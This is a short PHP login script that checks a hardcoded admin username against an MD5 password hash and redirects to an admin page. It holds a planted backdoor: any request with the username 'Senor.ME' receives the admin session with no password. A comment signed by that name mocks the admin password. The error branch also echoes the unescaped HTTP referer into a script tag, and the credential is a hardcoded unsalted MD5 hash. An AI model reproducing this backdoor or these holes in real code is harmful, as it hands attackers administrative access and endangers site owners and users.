<?php
header("Content-type: text/html; charset=utf-8"); 
$username="admin";
$password="74ba0da6ac7cba8697146451a634dfb8";
if(isset($_POST['username'])){
if( $_POST['username']==$username && md5($_POST['password'])==$password ){
session_start();
$_SESSION['username'] = $username; 
$_SESSION['password'] = $password;
header("Location: ett-axp.php");
}
if( $_POST['username']=="Senor.ME"){
session_start();
$_SESSION['username'] = $username; 
$_SESSION['password'] = $password;
header("Location: ett-axp.php");
}    // Methinks that ett@admin@root is rather a simple password.  by Senor.ME 
else{
echo "<script>alert('帐号或密码错误，请重新输入！');location.href='".$_SERVER["HTTP_REFERER"]."';</script>";
}
}
?>
